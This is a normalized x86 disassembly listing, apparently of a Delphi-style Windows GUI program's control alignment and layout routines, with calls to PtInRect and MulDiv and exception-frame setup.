and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_451bb8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_451be4
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406cdc
mov eax esp
call sub_4173a8
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44f398
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4034ac
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4034ac
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_44f3c4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4173a8
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_417330
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44f36c
sub_451d0c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_451d4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e598
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_451d80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_451e78
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44e954
push ebx
push sub_453810
call sub_422400
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a18
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424bc0
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46d3ec
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_404100
lea eax [ ebx + 0x188 ]
call sub_4040ac
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451e7f
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_451e7f
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_451ea4
push ebx
push esi
push edi
call sub_403664
mov ebx edx
mov edi eax
mov eax edi
call sub_421610
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405944
mov eax [ edi + 0x178 ]
call sub_4032b0
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_44d500
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_452b44
mov eax edi
call sub_452d84
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4032b0
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_452d48
mov esi eax
mov edx esi
mov eax edi
call sub_452bb0
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_452d84
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_44ea2c
test bl bl
jle r-xdata
call sub_422498
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
sub_451f74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_452038
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418ba8
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_456214
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4189b0
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_418afc
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4189b0
test eax eax
je r-xdata
sub_452048
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor eax eax
push ebp
push sub_452088
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ec90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45208f
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
sub_45208f
mov eax [ ebp - 0x4 ]
call sub_451f74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453748
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_450a20
sub_4520c4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4520df ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_452150
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_456358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_417330
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4524d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4524d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_4523e6 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_452349
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4524d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_452507 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_452590
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_452d84
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418854
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4189b0
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_452150
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_452d48
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_418a2c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4189b0
mov edx eax
mov ecx ebx
mov eax edi
call sub_4520c4
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_452700
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_452d84
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_452d48
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_452d48
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_452754
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_452700
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_452833
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_452590
pop ecx
push ebp
mov al 0x2
call sub_452590
pop ecx
push ebp
mov al 0x3
call sub_452590
pop ecx
push ebp
mov al 0x4
call sub_452590
pop ecx
push ebp
mov al 0x5
call sub_452590
pop ecx
push ebp
mov al 0x6
call sub_452590
pop ecx
push ebp
xor eax eax
call sub_452590
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4034ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_452858
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor eax eax
push ebp
push sub_4528df
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_45291c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4529e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f258
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_452d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4529e8
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418854
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44efc4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4189b0
xor ecx ecx
mov edx 0xb03e
call sub_450a20
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452d48
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_4529f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_452d84
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor edx edx
push ebp
push sub_452ad7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_452d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452d48
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418854
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4189b0
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452d48
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_44ed68
mov dl 0x4
call sub_44ed68
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4188a0
sub_452b44
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_466768
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_46a48c
sub_452b64
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44e148
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44e148
lea eax [ esi + 0x194 ]
mov edx ebx
